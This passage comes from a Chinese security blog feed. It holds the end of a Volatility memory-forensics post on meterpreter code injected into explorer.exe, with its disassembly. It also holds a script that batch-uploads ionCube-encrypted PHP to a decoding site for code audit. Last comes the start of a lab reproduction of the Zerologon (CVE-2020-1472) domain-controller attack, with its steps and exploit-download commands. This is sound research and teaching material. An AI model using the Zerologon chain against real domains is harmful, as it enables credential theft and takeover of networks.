class="line">0x025d003b 3c61             CMP AL, 0x61</span><br><span class="line">0x025d003d 7c02             JL 0x25d0041</span><br><span class="line">0x025d003f 2c               DB 0x2c</span><br><span class="line"></span><br><span class="line">Process: explorer.exe Pid: 2616 Address: 0x2610000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 38, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x02610000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............</span><br><span class="line">0x02610010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......</span><br><span class="line">0x02610020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x02610030  00 00 00 00 00 00 00 00 00 00 00 00 f0 00 00 00   ................</span><br><span class="line"></span><br><span class="line">0x02610000 4d               DEC EBP</span><br><span class="line">0x02610001 5a               POP EDX</span><br><span class="line">0x02610002 90               NOP</span><br><span class="line">0x02610003 0003             ADD [EBX], AL</span><br><span class="line">0x02610005 0000             ADD [EAX], AL</span><br><span class="line">0x02610007 000400           ADD [EAX+EAX], AL</span><br><span class="line">0x0261000a 0000             ADD [EAX], AL</span><br><span class="line">0x0261000c ff               DB 0xff</span><br><span class="line">0x0261000d ff00             INC DWORD [EAX]</span><br><span class="line">0x0261000f 00b800000000     ADD [EAX+0x0], BH</span><br><span class="line">0x02610015 0000             ADD [EAX], AL</span><br><span class="line">0x02610017 004000           ADD [EAX+0x0], AL</span><br><span class="line">0x0261001a 0000             ADD [EAX], AL</span><br><span class="line">0x0261001c 0000             ADD [EAX], AL</span><br><span class="line">0x0261001e 0000             ADD [EAX], AL</span><br><span class="line">0x02610020 0000             ADD [EAX], AL</span><br><span class="line">0x02610022 0000             ADD [EAX], AL</span><br><span class="line">0x02610024 0000             ADD [EAX], AL</span><br><span class="line">0x02610026 0000             ADD [EAX], AL</span><br><span class="line">0x02610028 0000             ADD [EAX], AL</span><br><span class="line">0x0261002a 0000             ADD [EAX], AL</span><br><span class="line">0x0261002c 0000             ADD [EAX], AL</span><br><span class="line">0x0261002e 0000             ADD [EAX], AL</span><br><span class="line">0x02610030 0000             ADD [EAX], AL</span><br><span class="line">0x02610032 0000             ADD [EAX], AL</span><br><span class="line">0x02610034 0000             ADD [EAX], AL</span><br><span class="line">0x02610036 0000             ADD [EAX], AL</span><br><span class="line">0x02610038 0000             ADD [EAX], AL</span><br><span class="line">0x0261003a 0000             ADD [EAX], AL</span><br><span class="line">0x0261003c f00000           LOCK ADD [EAX], AL</span><br><span class="line">0x0261003f 00               DB 0x0</span><br><span class="line"></span><br><span class="line">Process: explorer.exe Pid: 2616 Address: 0x2920000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 57, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x02920000  4d 5a 41 52 55 48 89 e5 48 83 ec 20 48 83 e4 f0   MZARUH..H...H...</span><br><span class="line">0x02920010  e8 00 00 00 00 5b 48 81 c3 23 5b 00 00 ff d3 48   .....[H..#[....H</span><br><span class="line">0x02920020  81 c3 c8 ae 02 00 48 89 3b 49 89 d8 6a 04 5a ff   ......H.;I..j.Z.</span><br><span class="line">0x02920030  d0 00 00 00 00 00 00 00 00 00 00 00 f0 00 00 00   ................</span><br><span class="line"></span><br><span class="line">0x02920000 4d               DEC EBP</span><br><span class="line">0x02920001 5a               POP EDX</span><br><span class="line">0x02920002 41               INC ECX</span><br><span class="line">0x02920003 52               PUSH EDX</span><br><span class="line">0x02920004 55               PUSH EBP</span><br><span class="line">0x02920005 48               DEC EAX</span><br><span class="line">0x02920006 89e5             MOV EBP, ESP</span><br><span class="line">0x02920008 48               DEC EAX</span><br><span class="line">0x02920009 83ec20           SUB ESP, 0x20</span><br><span class="line">0x0292000c 48               DEC EAX</span><br><span class="line">0x0292000d 83e4f0           AND ESP, -0x10</span><br><span class="line">0x02920010 e800000000       CALL 0x2920015</span><br><span class="line">0x02920015 5b               POP EBX</span><br><span class="line">0x02920016 48               DEC EAX</span><br><span class="line">0x02920017 81c3235b0000     ADD EBX, 0x5b23</span><br><span class="line">0x0292001d ffd3             CALL EBX</span><br><span class="line">0x0292001f 48               DEC EAX</span><br><span class="line">0x02920020 81c3c8ae0200     ADD EBX, 0x2aec8</span><br><span class="line">0x02920026 48               DEC EAX</span><br><span class="line">0x02920027 893b             MOV [EBX], EDI</span><br><span class="line">0x02920029 49               DEC ECX</span><br><span class="line">0x0292002a 89d8             MOV EAX, EBX</span><br><span class="line">0x0292002c 6a04             PUSH 0x4</span><br><span class="line">0x0292002e 5a               POP EDX</span><br><span class="line">0x0292002f ffd0             CALL EAX</span><br><span class="line">0x02920031 0000             ADD [EAX], AL</span><br><span class="line">0x02920033 0000             ADD [EAX], AL</span><br><span class="line">0x02920035 0000             ADD [EAX], AL</span><br><span class="line">0x02920037 0000             ADD [EAX], AL</span><br><span class="line">0x02920039 0000             ADD [EAX], AL</span><br><span class="line">0x0292003b 00f0             ADD AL, DH</span><br><span class="line">0x0292003d 0000             ADD [EAX], AL</span><br><span class="line">0x0292003f 00               DB 0x0</span><br><span class="line"></span><br><span class="line">Process: explorer.exe Pid: 2616 Address: 0x3e10000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 1, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x03e10000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x03e10010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x03e10020  00 00 e1 03 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x03e10030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line"></span><br><span class="line">0x03e10000 0000             ADD [EAX], AL</span><br><span class="line">0x03e10002 0000             ADD [EAX], AL</span><br><span class="line">0x03e10004 0000             ADD [EAX], AL</span><br><span class="line">0x03e10006 0000             ADD [EAX], AL</span><br><span class="line">0x03e10008 0000             ADD [EAX], AL</span><br><span class="line">0x03e1000a 0000             ADD [EAX], AL</span><br><span class="line">0x03e1000c 0000             ADD [EAX], AL</span><br><span class="line">0x03e1000e 0000             ADD [EAX], AL</span><br><span class="line">0x03e10010 0000             ADD [EAX], AL</span><br><span class="line">0x03e10012 0000             ADD [EAX], AL</span><br><span class="line">0x03e10014 0000             ADD [EAX], AL</span><br><span class="line">0x03e10016 0000             ADD [EAX], AL</span><br><span class="line">0x03e10018 0000             ADD [EAX], AL</span><br><span class="line">0x03e1001a 0000             ADD [EAX], AL</span><br><span class="line">0x03e1001c 0000             ADD [EAX], AL</span><br><span class="line">0x03e1001e 0000             ADD [EAX], AL</span><br><span class="line">0x03e10020 0000             ADD [EAX], AL</span><br><span class="line">0x03e10022 e103             LOOPZ 0x3e10027</span><br><span class="line">0x03e10024 0000             ADD [EAX], AL</span><br><span class="line">0x03e10026 0000             ADD [EAX], AL</span><br><span class="line">0x03e10028 0000             ADD [EAX], AL</span><br><span class="line">0x03e1002a 0000             ADD [EAX], AL</span><br><span class="line">0x03e1002c 0000             ADD [EAX], AL</span><br><span class="line">0x03e1002e 0000             ADD [EAX], AL</span><br><span class="line">0x03e10030 0000             ADD [EAX], AL</span><br><span class="line">0x03e10032 0000             ADD [EAX], AL</span><br><span class="line">0x03e10034 0000             ADD [EAX], AL</span><br><span class="line">0x03e10036 0000             ADD [EAX], AL</span><br><span class="line">0x03e10038 0000             ADD [EAX], AL</span><br><span class="line">0x03e1003a 0000             ADD [EAX], AL</span><br><span class="line">0x03e1003c 0000             ADD [EAX], AL</span><br><span class="line">0x03e1003e 0000             ADD [EAX], AL</span><br><span class="line"></span><br><span class="line">Process: explorer.exe Pid: 2616 Address: 0x3e90000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 16, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x03e90000  41 ba 80 00 00 00 48 b8 38 a1 d6 fd fe 07 00 00   A.....H.8.......</span><br><span class="line">0x03e90010  48 ff 20 90 41 ba 81 00 00 00 48 b8 38 a1 d6 fd   H...A.....H.8...</span><br><span class="line">0x03e90020  fe 07 00 00 48 ff 20 90 41 ba 82 00 00 00 48 b8   ....H...A.....H.</span><br><span class="line">0x03e90030  38 a1 d6 fd fe 07 00 00 48 ff 20 90 41 ba 83 00   8.......H...A...</span><br><span class="line"></span><br><span class="line">0x03e90000 41               INC ECX</span><br><span class="line">0x03e90001 ba80000000       MOV EDX, 0x80</span><br><span class="line">0x03e90006 48               DEC EAX</span><br><span class="line">0x03e90007 b838a1d6fd       MOV EAX, 0xfdd6a138</span><br><span class="line">0x03e9000c fe07             INC BYTE [EDI]</span><br><span class="line">0x03e9000e 0000             ADD [EAX], AL</span><br><span class="line">0x03e90010 48               DEC EAX</span><br><span class="line">0x03e90011 ff20             JMP DWORD [EAX]</span><br><span class="line">0x03e90013 90               NOP</span><br><span class="line">0x03e90014 41               INC ECX</span><br><span class="line">0x03e90015 ba81000000       MOV EDX, 0x81</span><br><span class="line">0x03e9001a 48               DEC EAX</span><br><span class="line">0x03e9001b b838a1d6fd       MOV EAX, 0xfdd6a138</span><br><span class="line">0x03e90020 fe07             INC BYTE [EDI]</span><br><span class="line">0x03e90022 0000             ADD [EAX], AL</span><br><span class="line">0x03e90024 48               DEC EAX</span><br><span class="line">0x03e90025 ff20             JMP DWORD [EAX]</span><br><span class="line">0x03e90027 90               NOP</span><br><span class="line">0x03e90028 41               INC ECX</span><br><span class="line">0x03e90029 ba82000000       MOV EDX, 0x82</span><br><span class="line">0x03e9002e 48               DEC EAX</span><br><span class="line">0x03e9002f b838a1d6fd       MOV EAX, 0xfdd6a138</span><br><span class="line">0x03e90034 fe07             INC BYTE [EDI]</span><br><span class="line">0x03e90036 0000             ADD [EAX], AL</span><br><span class="line">0x03e90038 48               DEC EAX</span><br><span class="line">0x03e90039 ff20             JMP DWORD [EAX]</span><br><span class="line">0x03e9003b 90               NOP</span><br><span class="line">0x03e9003c 41               INC ECX</span><br><span class="line">0x03e9003d ba               DB 0xba</span><br><span class="line">0x03e9003e 83               DB 0x83</span><br><span class="line">0x03e9003f 00               DB 0x0</span><br><span class="line"></span><br><span class="line">Process: explorer.exe Pid: 2616 Address: 0x4360000</span><br><span class="line">Vad Tag: VadS Protection: PAGE_EXECUTE_READWRITE</span><br><span class="line">Flags: CommitCharge: 106, MemCommit: 1, PrivateMemory: 1, Protection: 6</span><br><span class="line"></span><br><span class="line">0x04360000  4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00   MZ..............</span><br><span class="line">0x04360010  b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00   ........@.......</span><br><span class="line">0x04360020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00   ................</span><br><span class="line">0x04360030  00 00 00 00 00 00 00 00 00 00 00 00 00 01 00 00   ................</span><br><span class="line"></span><br><span class="line">0x04360000 4d               DEC EBP</span><br><span class="line">0x04360001 5a               POP EDX</span><br><span class="line">0x04360002 90               NOP</span><br><span class="line">0x04360003 0003             ADD [EBX], AL</span><br><span class="line">0x04360005 0000             ADD [EAX], AL</span><br><span class="line">0x04360007 000400           ADD [EAX+EAX], AL</span><br><span class="line">0x0436000a 0000             ADD [EAX], AL</span><br><span class="line">0x0436000c ff               DB 0xff</span><br><span class="line">0x0436000d ff00             INC DWORD [EAX]</span><br><span class="line">0x0436000f 00b800000000     ADD [EAX+0x0], BH</span><br><span class="line">0x04360015 0000             ADD [EAX], AL</span><br><span class="line">0x04360017 004000           ADD [EAX+0x0], AL</span><br><span class="line">0x0436001a 0000             ADD [EAX], AL</span><br><span class="line">0x0436001c 0000             ADD [EAX], AL</span><br><span class="line">0x0436001e 0000             ADD [EAX], AL</span><br><span class="line">0x04360020 0000             ADD [EAX], AL</span><br><span class="line">0x04360022 0000             ADD [EAX], AL</span><br><span class="line">0x04360024 0000             ADD [EAX], AL</span><br><span class="line">0x04360026 0000             ADD [EAX], AL</span><br><span class="line">0x04360028 0000             ADD [EAX], AL</span><br><span class="line">0x0436002a 0000             ADD [EAX], AL</span><br><span class="line">0x0436002c 0000             ADD [EAX], AL</span><br><span class="line">0x0436002e 0000             ADD [EAX], AL</span><br><span class="line">0x04360030 0000             ADD [EAX], AL</span><br><span class="line">0x04360032 0000             ADD [EAX], AL</span><br><span class="line">0x04360034 0000             ADD [EAX], AL</span><br><span class="line">0x04360036 0000             ADD [EAX], AL</span><br><span class="line">0x04360038 0000             ADD [EAX], AL</span><br><span class="line">0x0436003a 0000             ADD [EAX], AL</span><br><span class="line">0x0436003c 0001             ADD [ECX], AL</span><br><span class="line">0x0436003e 0000             ADD [EAX], AL</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以看到<code>2616</code>进程检出了MZ头，dump下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌─[root@parrot]─[/home/parrot/Desktop]</span><br><span class="line">└──╼ #volatility -f /home/parrot/Desktop/WIN-L74K1LLT618-20250823-093248.raw --profile=Win7SP1x64 memdump -p 2616 -D /home/parrot/Desktop/dump/</span><br><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line">************************************************************************</span><br><span class="line">Writing explorer.exe [  2616] to 2616.dmp</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这时候把dmp文件传到VT通常是杀不出来的，毕竟文件体积在那</p><p><img src="/images/image-20201026143108818.png" alt="image-20201026143108818"></p><p>用<code>foremost</code>提取下再看看</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌─[parrot@parrot]─[~/Desktop/dump]</span><br><span class="line">└──╼ $foremost -i 2616.dmp</span><br><span class="line">Processing: 2616.dmp</span><br><span class="line">|*****|</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="/images/image-20201026143155763.png" alt="image-20201026143155763"></p><p>已经按照文件类型自动分了类，直接看DLL文件夹</p><p><img src="/images/image-20201026143348020.png" alt="image-20201026143348020"></p><p>传VT</p><p><img src="/images/image-20201026143436313.png"></p><p><code>meterpreter</code>已检出</p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP ioncube V10.X解密</title>
      <link href="/p/cbd0.html"/>
      <url>/p/cbd0.html</url>
      
        <content type="html"><![CDATA[<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>项目中碰到个用<code>ionCube V10</code>加密的源码，需要解密做审计，记录下踩的坑</p><p><img src="/images/image-20201011210643747.png" alt="image-20201011210643747"></p><p>文件数量2000多，找了一番网站发现<code>https://easytoyou.eu/</code>可以提供解密服务，</p><p><img src="/images/image-20201011210820831.png" alt="image-20201011210820831"></p><p>BTW，这个站一次只能上传一个文件，手动点2000多次不说累死也得烦死</p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><p>按照惯例，先注册个号看看有什么功能</p><p><img src="/images/image-20201011210916064.png" alt="image-20201011210916064"></p><p>好嘛 10欧元30天会员，冲了再看看解密面板</p><p><img src="/images/image-20201011211004379.png" alt="image-20201011211004379"></p><p>面板变了，上传个加密的文件抓个包看看</p><p><img src="/images/image-20201011211326533.png" alt="image-20201011211326533"></p><p>解密完成后在页面中回显下载链接，那么就可以写脚本批量跑了。</p><h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>脚本需要实现的功能是遍历所有指定格式的文件，保存获取到的列表，上传解密，下载解密后的文件</p><p>直接贴代码</p><h2 id="遍历符合格式的文件代码"><a href="#遍历符合格式的文件代码" class="headerlink" title="遍历符合格式的文件代码"></a>遍历符合格式的文件代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Load Folders</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_all_path</span>(<span class="params">self</span>):</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(self.FileList):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        postfix = <span class="built_in">set</span>([<span class="string">&#x27;php&#x27;</span>])  <span class="comment"># 设置要记录的文件格式</span></span><br><span class="line">        <span class="keyword">for</span> maindir, subdir, file_name_list <span class="keyword">in</span> os.walk(self.dstFolder):</span><br><span class="line">            <span class="keyword">for</span> filename <span class="keyword">in</span> file_name_list:</span><br><span class="line">                apath = os.path.join(maindir, filename)</span><br><span class="line">                <span class="keyword">if</span> <span class="literal">True</span>:  <span class="comment"># 保存全部文件名。若要保留指定文件格式的文件名则注释该句</span></span><br><span class="line">                    <span class="comment"># 匹配后缀，只保存所选的文件格式。若要保存全部文件，则注释该句</span></span><br><span class="line">                    <span class="keyword">if</span> apath.split(<span class="string">&#x27;.&#x27;</span>)[-<span class="number">1</span>] <span class="keyword">in</span> postfix:</span><br><span class="line">                        <span class="keyword">try</span>:</span><br><span class="line">                            self.success(<span class="string">&#x27;GET &#x27;</span> + <span class="built_in">str</span>(apath))</span><br><span class="line">                            <span class="keyword">with</span> <span class="built_in">open</span>(self.FileList, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> fo:</span><br><span class="line">                                fo.writelines(apath)</span><br><span class="line">                                fo.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">                        <span class="keyword">except</span>:</span><br><span class="line">                            <span class="keyword">pass</span>  <span class="comment"># 所有异常全部忽略即可</span></span><br></pre></td></tr></table></figure><p>写到一半想起来个事，直接覆盖源码有点不太合适，所以需要复制一份到保存的目录，然后用复制后的文件解密</p><h2 id="拷贝到另一个文件夹代码"><a href="#拷贝到另一个文件夹代码" class="headerlink" title="拷贝到另一个文件夹代码"></a>拷贝到另一个文件夹代码</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Copy source dir to dest dir</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">copy_search_file</span>(<span class="params">self, srcDir, desDir</span>):</span><br><span class="line">    self.info(<span class="string">&#x27;Copy files to &#x27;</span> + desDir)</span><br><span class="line">    <span class="keyword">if</span> os.path.exists(self.FileList):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(desDir):</span><br><span class="line">            os.makedirs(desDir)</span><br><span class="line">        <span class="keyword">for</span> files <span class="keyword">in</span> os.listdir(srcDir):</span><br><span class="line">            name = os.path.join(srcDir, files)</span><br><span class="line">            back_name = os.path.join(desDir, files)</span><br><span class="line">            <span class="keyword">if</span> os.path.isfile(name):</span><br><span class="line">                shutil.copy(name, back_name)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(back_name):</span><br><span class="line">                    os.makedirs(back_name)</span><br><span class="line">                self.copy_search_file(name, back_name)</span><br></pre></td></tr></table></figure><p>剩下的就是核心代码了</p><h2 id="获取待解密的文件列表"><a href="#获取待解密的文件列表" class="headerlink" title="获取待解密的文件列表"></a>获取待解密的文件列表</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Load Files</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_FilesList</span>(<span class="params">self</span>):</span><br><span class="line">    self.success(<span class="string">&#x27;Loading Need Decrpyt File List.&#x27;</span>)</span><br><span class="line">    startTime = time.process_time()</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(self.FileList, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> needDecryptFile:</span><br><span class="line">        DecryptFileList = needDecryptFile.read().splitlines()</span><br><span class="line">    endTime = time.process_time()</span><br><span class="line">    self.success(<span class="string">&#x27;Load &#123;0&#125; File(s) in &#123;1&#125; s, \nNow start Decrypt.&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">        <span class="built_in">len</span>(DecryptFileList), endTime - startTime))</span><br><span class="line">    <span class="keyword">return</span> DecryptFileList</span><br></pre></td></tr></table></figure><h2 id="上传-下载"><a href="#上传-下载" class="headerlink" title="上传+下载"></a>上传+下载</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Decode_Files</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode_Files</span>(<span class="params">self, DecryptFileList</span>):</span><br><span class="line">    <span class="keyword">for</span> files <span class="keyword">in</span> DecryptFileList:</span><br><span class="line">        self.info(<span class="string">&#x27;Load &#x27;</span> + files + <span class="string">&#x27;, filename &#x27;</span> + files.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>])</span><br><span class="line">        file_content = <span class="built_in">open</span>(files, <span class="string">&#x27;rb+&#x27;</span>).read()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">b&#x27;ionCube Loader&#x27;</span> <span class="keyword">in</span> file_content:</span><br><span class="line">            file_name = files.split(<span class="string">&quot;\\&quot;</span>)[-<span class="number">1</span>]</span><br><span class="line">            keyParam = (datetime.datetime.now() +</span><br><span class="line">                        datetime.timedelta(hours=self.timeZone)).strftime(<span class="string">&quot;%H&quot;</span>)</span><br><span class="line">            file = &#123;</span><br><span class="line">                <span class="built_in">str</span>(keyParam) + <span class="string">&#x27;[]&#x27;</span>:</span><br><span class="line">                (file_name, file_content, <span class="string">&#x27;application/octet-stream&#x27;</span>)</span><br><span class="line">            &#125;</span><br><span class="line">            self.info(<span class="string">&quot;Upload &quot;</span> + files)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                res = requests.post(self.ez2uURL,</span><br><span class="line">                                    files=file,</span><br><span class="line">                                    headers=self.reqHeader,</span><br><span class="line">                                    timeout=self.reqTimeout)</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;403 Forbidden&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> res.text:</span><br><span class="line">                    <span class="comment">#print(res.content)</span></span><br><span class="line">                    soup = BeautifulSoup(res.text, <span class="string">&quot;lxml&quot;</span>)</span><br><span class="line">                    htmlATag = soup.select(</span><br><span class="line">                        <span class="string">&#x27;div.container &gt; div.alert.alert-success.fade.in &gt; a&#x27;</span></span><br><span class="line">                    )</span><br><span class="line">                    <span class="keyword">if</span> <span class="built_in">len</span>(htmlATag) == <span class="number">0</span>:</span><br><span class="line">                        self.errorLog(</span><br><span class="line">                            <span class="string">&#x27;[!] File &#123;0&#125; maybe already decrypt&#x27;</span>.<span class="built_in">format</span>(</span><br><span class="line">                                files))</span><br><span class="line">                    <span class="keyword">else</span>:</span><br><span class="line">                        self.success(<span class="string">&quot;Get received link &quot;</span> +</span><br><span class="line">                                     htmlATag[<span class="number">0</span>].string +</span><br><span class="line">                                     <span class="string">&quot; Downloading...&quot;</span>)</span><br><span class="line">                        res2 = requests.get(htmlATag[<span class="number">0</span>].string,</span><br><span class="line">                                            headers=self.reqHeader,</span><br><span class="line">                                            timeout=self.reqTimeout)</span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(files, <span class="string">&#x27;wb+&#x27;</span>) <span class="keyword">as</span> df:</span><br><span class="line">                            df.write(res2.content)</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    self.errorLog(</span><br><span class="line">                        <span class="string">&#x27;[!] Maybe Network Error? File &#123;0&#125; Decrypt FAILED&#x27;</span></span><br><span class="line">                        .<span class="built_in">format</span>(files))</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                self.errorLog(</span><br><span class="line">                    <span class="string">&#x27;[!] Maybe Network Error? File &#123;0&#125; Decrypt FAILED&#x27;</span>.</span><br><span class="line">                    <span class="built_in">format</span>(files))</span><br></pre></td></tr></table></figure><h2 id="日志功能"><a href="#日志功能" class="headerlink" title="日志功能"></a>日志功能</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Log</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">errorLog</span>(<span class="params">self, content</span>):</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(self.errorLogPath, <span class="string">&#x27;a+&#x27;</span>) <span class="keyword">as</span> err:</span><br><span class="line">        err.write(<span class="string">&#x27;[&#x27;</span> +</span><br><span class="line">                  datetime.datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>) +</span><br><span class="line">                  <span class="string">&#x27;] &#x27;</span> + content + <span class="string">&#x27; \n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">info</span>(<span class="params">self, content</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[&#x27;</span> + datetime.datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>) +</span><br><span class="line">          <span class="string">&#x27;] [*] &#x27;</span> + content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">success</span>(<span class="params">self, content</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[&#x27;</span> + datetime.datetime.now().strftime(<span class="string">&quot;%Y-%m-%d %H:%M:%S&quot;</span>) +</span><br><span class="line">          <span class="string">&#x27;] [+] &#x27;</span> + content)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># run</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">self</span>):</span><br><span class="line">    self.copy_search_file(self.sourceFolder, self.dstFolder)</span><br><span class="line">    self.get_all_path()</span><br><span class="line">    self.DecryptFileList = self.decrypt_FilesList()</span><br><span class="line">    self.decode_Files(self.DecryptFileList)</span><br></pre></td></tr></table></figure><p>亿点点配置</p><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">class</span> <span class="title class_">options</span>:</span><br><span class="line">        sourceFolder = <span class="string">&quot;&quot;</span> <span class="comment"># need decode path</span></span><br><span class="line">        dstFolder = <span class="string">&#x27;&#x27;</span> <span class="comment"># save path</span></span><br><span class="line">        ez2uURL = <span class="string">&#x27;https://easytoyou.eu/decoder/ic10php56/&#x27;</span></span><br><span class="line">        reqHeader = &#123;&#125;</span><br><span class="line">        reqHeader[<span class="string">&#x27;Cookie&#x27;</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        reqHeader[<span class="string">&#x27;User-Agent&#x27;</span>] = <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36&#x27;</span></span><br><span class="line">        errorLogPath = dstFolder + <span class="string">&#x27;error.log&#x27;</span> <span class="comment"># errorlog path</span></span><br><span class="line">        timeZone=-<span class="number">7</span> <span class="comment">#CN to EU </span></span><br><span class="line">        reqTimeout=<span class="number">20</span> <span class="comment">#request timeout</span></span><br><span class="line"></span><br><span class="line">    deIC = IC_Decrypt(options)</span><br><span class="line">    deIC.run()</span><br></pre></td></tr></table></figure><p>然后挂机跑即可，由于网络问题导致无法解密或解密失败的文件会输出到保存目录的error.log里，多跑几次即可。</p><h1 id="成果"><a href="#成果" class="headerlink" title="成果"></a>成果</h1><p><img src="/images/image-20201011212512201.png" alt="image-20201011212512201"></p><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p><a href="https://github.com/NS-Sp4ce/easytoyou_script">https://github.com/NS-Sp4ce/easytoyou_script</a></p>]]></content>
      
      
      <categories>
          
          <category> 日常 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 日常 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>林级域环境下复现CVE-2020-1472</title>
      <link href="/p/9b5.html"/>
      <url>/p/9b5.html</url>
      
        <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><blockquote><p>域林环境</p><p><strong>根DC</strong>：10.100.100.100（server2019）</p><p>一级林DC：10.100.100.101（server2016）</p><p>二级林DC：10.100.100.102（server2012R2）</p><p>跳板机（攻击机）：10.100.100.105（WIN10）</p></blockquote><p>简要拓扑</p><p><img src="/images/image-20200929143250702.png" alt="image-20200929143250702"></p><h1 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h1><blockquote><p>利用过程：将域控机器账户密码设置为空-&gt;读取域管hash-&gt;读取sam文件hash(ntds.dit)-&gt;恢复域控机器账户密码</p></blockquote><h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><p>首先安装<code>impacket</code>:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/SecureAuthCorp/impacket.git</span><br><span class="line">cd impacket</span><br><span class="line">pip install -r requirements.txt</span><br><span class="line">python setup.py install</span><br></pre></td></tr></table></figure><p>然后下载利用脚本</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/dirkjanm/CVE-2020-1472</span><br><span class="line">cd 